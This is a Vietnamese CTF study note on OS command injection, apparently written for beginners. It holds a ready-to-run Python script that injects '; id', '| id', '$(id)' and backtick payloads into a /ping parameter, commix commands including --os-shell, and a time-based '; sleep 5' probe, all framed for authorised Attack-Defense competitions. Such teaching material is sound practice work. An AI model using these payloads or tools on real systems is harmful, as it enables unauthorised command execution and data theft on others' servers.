# Command Injection (chèn lệnh hệ điều hành)

Một số trang web, khi bạn nhập dữ liệu (ví dụ 1 địa chỉ IP để "ping thử"), code phía sau âm thầm ghép chữ bạn gõ vào 1 lệnh hệ điều hành thật rồi chạy nó, ví dụ ghép vào lệnh `ping <bạn gõ>`. Nếu code không kiểm tra, bạn có thể gõ thêm 1 ký tự đặc biệt (như `;` hoặc `|`) để "nối" thêm 1 lệnh khác của riêng mình vào — hệ điều hành tưởng đó là 1 câu lệnh bình thường và chạy luôn cả phần bạn thêm. Ví dụ gõ `127.0.0.1; id` có thể khiến server chạy luôn lệnh `id` (xem mình đang chạy với quyền gì) và trả kết quả ra cho bạn đọc được.

Trên Burp bạn nhận ra lỗi này khi: trang có chức năng kiểu "ping", "kiểm tra domain", "convert file bằng tool ngoài"... và khi bạn thêm `; id` hoặc `| id` vào tham số, response hiện ra dòng `uid=... gid=...` (kết quả lệnh `id` của Linux) thay vì kết quả ping bình thường — đó là dấu hiệu server đã chạy lệnh của bạn.

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # Mỗi ký tự đặc biệt dưới đây có ý nghĩa khác nhau trong shell (cửa sổ lệnh của hệ điều hành):
    # ";"   -> kết thúc lệnh trước, chạy tiếp lệnh sau, dù lệnh trước đúng hay sai
    # "|"   -> lấy kết quả lệnh trước, đưa làm "đầu vào" cho lệnh sau (ít dùng để nối lệnh mới hơn)
    # "$(...)" và "`...`" -> chạy lệnh bên trong trước, rồi chèn kết quả vào chỗ đó (hay dùng khi "; |" bị lọc)
    payloads = ["; id", "| id", "$(id)", "`id`"]

    for p in payloads:
        # ghép payload ngay sau 1 giá trị hợp lệ (127.0.0.1) để lệnh gốc vẫn chạy được, không báo lỗi lộ ra ngay
        r = session.post(
            f"{base_url}/ping",
            data={"host": f"127.0.0.1{p}"},
            timeout=5,
        )
        text = r.text.lower()
        # "uid=" / "gid=" là output quen thuộc của lệnh `id` trên Linux -> nếu thấy, chắc chắn lệnh đã chạy
        if "uid=" in text or "gid=" in text:
            print("DÍNH:", p)
            print(r.text[:300])
            return r.text  # có thể đổi payload "id" thành "cat /flag.txt" sau khi đã xác nhận dính
        print(p, "->", r.status_code, "chưa thấy dấu hiệu")
    return None


if __name__ == "__main__":
    print(solve_one(s, base))
```

## Giải thích cho người mới

- 4 payload trong list là 4 cách khác nhau để "nối thêm lệnh" trong shell — mỗi hệ thống lọc khác nhau nên thường phải thử lần lượt cả 4, không chỉ 1.
- `f"127.0.0.1{p}"` nghĩa là ghép chuỗi `127.0.0.1` (1 IP hợp lệ, để chức năng ping gốc chạy bình thường, không bị từ chối ngay vì "IP sai") với payload `p` ngay sau, giống cách bạn gõ trong ô input trên Burp.
- Vòng `for` thử từng payload, mỗi lần gửi xong kiểm tra `text` (chữ thường hoá của response) có chứa `"uid="` hay `"gid="` không — đây là cách code tự nhận biết "lệnh `id` đã thực sự chạy" mà không cần bạn tự đọc từng response bằng mắt.
- Khi `return r.text` chạy, hàm dừng lại ngay (không thử tiếp các payload còn lại) vì đã tìm được payload hoạt động — lúc đó bạn đổi `id` trong payload thành lệnh thật cần dùng (ví dụ `cat /flag.txt`, `ls /`) để lấy flag.

## Dùng tool có sẵn `commix` thay vì tự viết tay

Nếu đã nghi command injection mà thử tay 4 payload trên không ra, hoặc muốn tool tự dò kỹ hơn (commix tự thử hàng chục biến thể, tự né 1 số WAF, tự tìm ra kiểu blind bằng time-based nếu cần), dùng `commix` đã có sẵn tại `~/hoc/CTF/Tools/web/commix/`:

```bash
spwn   # activate venv pwn trước, commix cần python3 + vài thư viện trong venv này
cd ~/hoc/CTF/Tools/web/commix

# Tham số bị nghi dính ở QUERY STRING (GET) -- đặt ngay trong URL
python3 commix.py -u "http://target/ping?host=127.0.0.1" --batch

# Tham số bị nghi dính ở BODY (POST form) -- dùng --data, giống data={...} trong requests
python3 commix.py -u "http://target/ping" --data="host=127.0.0.1" --batch

# Nếu phải gửi qua Burp proxy để debug thêm
python3 commix.py -u "http://target/ping?host=127.0.0.1" --proxy="http://127.0.0.1:8080" --batch
```

- `--batch`: không hỏi lại gì cả, tự lấy mặc định cho mọi câu hỏi — bắt buộc có khi chạy không tương tác (không đứng canh màn hình).
- commix tự thử nhiều kỹ thuật (`results-based`, `blind`, `time-based`) và tự in ra ngay khi tìm thấy dòng kiểu `[+] ... (CVE/technique) injection was found`. Nếu dính, nó hỏi (hoặc tự làm nếu `--batch`) có muốn mở `--os-shell` (shell tương tác chạy lệnh hệ thống qua chính lỗ hổng này) không — gõ `python3 commix.py -u "..." --os-shell` để vào thẳng shell, từ đó gõ lệnh đọc flag (`cat /flag.txt`, `ls /`) như gõ lệnh bình thường trên máy bạn.
- Nếu không chắc tham số nào dính trong URL dài nhiều tham số, thêm `*` vào đúng vị trí nghi, ví dụ `?host=127.0.0.1*&other=1` — commix chỉ thử vào chỗ có `*`.

## Lưu ý nhanh

- Nếu không thấy kết quả hiện ngay trong response (gọi là "blind" — mù, không thấy trực tiếp), thử đo thời gian trả lời bằng payload gây chờ, ví dụ `; sleep 5` — nếu response chậm hẳn 5 giây, chứng tỏ lệnh đã chạy dù không thấy output.
- Chỗ bị dính có thể không phải là `data=` (form) — có thể là `json=`, `params=` (query), hoặc 1 header; xác nhận đúng vị trí trước khi đổi payload, giữ đúng Content-Type như Burp đã gửi.
- Payload làm hỏng service (ví dụ `rm -rf`, `; reboot`) tuyệt đối không dùng trong thi Attack-Defense — mục tiêu chỉ là đọc flag, không phá máy đối phương hay chính mình.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
